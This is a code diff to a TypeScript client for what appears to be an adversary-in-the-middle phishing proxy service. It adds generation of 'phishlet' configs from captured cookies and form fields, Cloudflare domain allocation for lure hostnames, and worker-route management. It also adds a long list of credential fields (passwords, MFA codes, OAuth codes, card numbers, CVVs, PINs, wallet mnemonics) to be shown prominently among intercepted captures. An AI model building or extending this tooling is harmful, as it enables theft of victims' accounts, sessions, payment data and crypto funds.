@@ -16,7 +16,15 @@ async function safeFetch(url: string, init?: RequestInit): Promise<Response> {
 
 declare const process: { env: Record<string, string | undefined> };
 
-const BASE_URL = process.env.EXPO_PUBLIC_RORK_FUNCTIONS_URL ?? "";
+let BASE_URL = process.env.EXPO_PUBLIC_RORK_FUNCTIONS_URL || "";
+
+export function getBaseUrl(): string {
+  return BASE_URL.replace(/\/$/, "");
+}
+
+export function setBaseUrl(url: string): void {
+  BASE_URL = url.replace(/\/$/, "");
+}
 
 export type Item = {
   id: number;
@@ -155,6 +163,8 @@ export type Proxy = {
   injectJs: string;
   /** Whether the custom JS snippet is active. */
   injectJsEnabled: boolean;
+  /** Auto-generated YAML phishlet config for this target. */
+  phishlet: string;
   createdAt: number;
   updatedAt: number;
 };
@@ -175,9 +185,12 @@ export type ZonesResult = {
  * Lists the purchased domains in the connected Cloudflare account. Returns
  * `configured: false` (without throwing) when credentials are not set yet.
  */
-export async function fetchCloudflareZones(): Promise<ZonesResult> {
+export async function fetchCloudflareZones(authHeader?: string): Promise<ZonesResult> {
+  const headers: Record<string, string> = {};
+  if (authHeader) headers["Authorization"] = authHeader;
   const response = await safeFetch(`${BASE_URL}/api/cloudflare/zones`, {
     cache: "no-store",
+    headers,
   });
   const text = await response.text();
   const json = (text ? JSON.parse(text) : {}) as {
@@ -200,14 +213,15 @@ export async function fetchCloudflareZones(): Promise<ZonesResult> {
  * Allocates a purchased Cloudflare domain to a proxy target. Creates the DNS
  * record pointing at the gateway and stores the hostname on the target.
  */
-export async function allocateProxyDomain(input: {
-  proxyId: number;
-  zoneId: string;
-  hostname: string;
-}): Promise<{ hostname: string; target: string }> {
+export async function allocateProxyDomain(
+  input: { proxyId: number; zoneId: string; hostname: string },
+  authHeader?: string,
+): Promise<{ hostname: string; target: string }> {
+  const headers: Record<string, string> = { "Content-Type": "application/json" };
+  if (authHeader) headers["Authorization"] = authHeader;
   const response = await safeFetch(`${BASE_URL}/api/cloudflare/allocate`, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers,
     body: JSON.stringify(input),
   });
   const data = await parse<{ data: { hostname: string; target: string } }>(
@@ -244,7 +258,7 @@ export async function createProxy(input: {
 
 export async function updateProxy(
   id: number,
-  input: Partial<{ name: string; targetUrl: string; enabled: boolean; interceptEnabled: boolean; injectJs: string; injectJsEnabled: boolean }>,
+  input: Partial<{ name: string; targetUrl: string; enabled: boolean; interceptEnabled: boolean; injectJs: string; injectJsEnabled: boolean; phishlet: string }>,
   authHeader?: string,
 ): Promise<Proxy> {
   const headers: Record<string, string> = { "Content-Type": "application/json" };
@@ -266,6 +280,90 @@ export async function deleteProxy(id: number, authHeader?: string): Promise<void
     headers,
   });
   await parse<{ data: Proxy }>(response);
+}
+
+export type ReconInput = {
+  targetUrl: string;
+  captured: {
+    urls?: string[];
+    cookies?: string[];
+    formFields?: { name: string; type: string }[];
+    redirects?: string[];
+    domains?: string[];
+  };
+};
+
+export type ReconResult = {
+  proxyId: number;
+  phishlet: string;
+};
+
+/**
+ * Sends captured reconnaissance data to the worker and returns a generated
+ * YAML phishlet config. The worker also saves the phishlet on the proxy.
+ */
+export async function generatePhishlet(
+  proxyId: number,
+  input: ReconInput,
+  authHeader?: string,
+): Promise<ReconResult> {
+  const headers: Record<string, string> = { "Content-Type": "application/json" };
+  if (authHeader) headers["Authorization"] = authHeader;
+  const response = await safeFetch(`${BASE_URL}/api/proxies/${proxyId}/recon`, {
+    method: "POST",
+    headers,
+    body: JSON.stringify(input),
+  });
+  const data = await parse<{ data: ReconResult }>(response);
+  return data.data;
+}
+
+export type WorkerRoute = {
+  id: string;
+  pattern: string;
+  script: string;
+  zoneId?: string;
+  zoneName?: string;
+};
+
+export type WorkerRoutesResult = {
+  configured: boolean;
+  routes: WorkerRoute[];
+  error?: string;
+};
+
+export async function fetchWorkerRoutes(authHeader?: string): Promise<WorkerRoutesResult> {
+  const headers: Record<string, string> = {};
+  if (authHeader) headers["Authorization"] = authHeader;
+  const response = await safeFetch(`${BASE_URL}/api/cloudflare/worker-routes`, {
+    cache: "no-store",
+    headers,
+  });
+  const text = await response.text();
+  const json = (text ? JSON.parse(text) : {}) as {
+    success?: boolean;
+    configured?: boolean;
+    data?: WorkerRoute[];
+    error?: string;
+  };
+  if (!json.success) {
+    return { configured: json.configured ?? false, routes: [], error: json.error };
+  }
+  return { configured: true, routes: json.data ?? [] };
+}
+
+export async function deleteWorkerRoute(
+  routeId: string,
+  zoneId: string,
+  authHeader?: string,
+): Promise<void> {
+  const headers: Record<string, string> = {};
+  if (authHeader) headers["Authorization"] = authHeader;
+  const response = await safeFetch(`${BASE_URL}/api/cloudflare/worker-routes/${zoneId}/${routeId}`, {
+    method: "DELETE",
+    headers,
+  });
+  await parse<{ success: boolean }>(response);
 }
 
 export type InterceptCapture = {
@@ -385,9 +483,78 @@ export async function deleteWorkerConfig(authHeader?: string): Promise<WorkerCon
 
 /** Sensitive-field patterns for masking in the UI. */
 export const SENSITIVE_FIELDS = [
-  "password", "passwd", "secret", "token", "api_key", "apikey",
-  "authorization", "session", "cookie", "jwt", "bearer",
-  "access_token", "refresh_token", "id_token", "private_key",
+  // Passwords
+  "password", "passwd", "pass", "pwd", "passcode", "passphrase",
+  "new_password", "old_password", "current_password", "confirm_password",
+  "newpassword", "oldpassword", "currentpassword", "confirmpassword",
+  // Secrets / keys
+  "secret", "api_key", "apikey", "api_secret", "apisecret",
+  "client_secret", "app_secret", "private_key", "privatekey",
+  "signing_key", "encryption_key", "webhook_secret",
+  // Tokens (auth)
+  "token", "access_token", "refresh_token", "id_token", "auth_token",
+  "bearer", "authorization", "x-auth-token", "x-api-key",
+  "oauth_token", "oauth_token_secret", "oauth_verifier",
+  "code", "auth_code", "authorization_code",
+  // Session / cookies
+  "session", "session_id", "sessionid", "session_token",
+  "cookie", "csrf", "csrf_token", "xsrf", "xsrf_token",
+  "_token", "__token", "authenticity_token",
+  // JWT
+  "jwt", "id_token", "nonce",
+  // MFA / OTP
+  "otp", "totp", "hotp", "mfa_code", "mfa_token", "two_factor",
+  "twofactor", "2fa", "verification_code", "verificationcode",
+  "sms_code", "smscode", "backup_code", "recovery_code",
+  // Payment / financial
+  "card", "card_number", "cardnumber", "pan",
+  "cvv", "cvc", "cvv2", "csc",
+  "pin", "card_pin", "atm_pin",
+  "expiry", "expiration", "exp_date", "expdate",
+  "ssn", "social_security", "tax_id", "ein",
+  "iban", "bsb", "routing_number", "account_number",
+  "bank_account", "sort_code",
+  // Crypto
+  "mnemonic", "seed_phrase", "private_key", "keystore",
+  "wallet_password", "wallet_key",
+];
+
+/** Credential/identity field patterns shown prominently in the intercept UI. */
+export const CREDENTIAL_FIELDS = [
+  // === IDENTITY — shown first ===
+  // Username variants
+  "username", "user_name", "user", "uname", "login_name", "loginname",
+  "handle", "screen_name", "screenname", "display_name", "displayname",
+  "nick", "nickname", "alias",
+  // Email variants
+  "email", "email_address", "emailaddress", "mail", "e_mail", "e-mail",
+  "login_email", "account_email", "contact_email",
+  // Phone variants
+  "phone", "phone_number", "phonenumber", "mobile", "mobile_number",
+  "msisdn", "cell", "cellphone", "telephone", "tel",
+  // Login / account identifiers
+  "login", "loginid", "login_id",
+  "account", "account_id", "accountid", "account_name", "accountname",
+  "member", "member_id", "memberid", "membership_id", "membershipid",
+  "customer", "customer_id", "customerid", "client", "client_id", "clientid",
+  "player", "player_id", "playerid",
+  "userid", "user_id", "uid",
+  "subscriber", "subscriber_id",
+  "identity", "identity_number", "national_id",
+  // === PASSWORDS — shown after identity ===
+  "password", "passwd", "pass", "pwd", "passcode", "passphrase",
+  "new_password", "old_password", "confirm_password",
+  // === MFA / OTP ===
+  "otp", "totp", "mfa_code", "two_factor", "2fa",
+  "verification_code", "sms_code", "backup_code",
+  // === OAUTH / SSO ===
+  "code", "auth_code", "authorization_code", "oauth_token",
+  "id_token", "access_token",
+  // === PAYMENT / FINANCIAL ===
+  "card_number", "pan", "cvv", "cvc", "pin",
+  "expiry", "expiration", "iban", "account_number",
+  // === CRYPTO ===
+  "wallet", "wallet_address", "address", "mnemonic",
 ];
 
 /** Mask a value by showing first 2 and last 2 characters. */
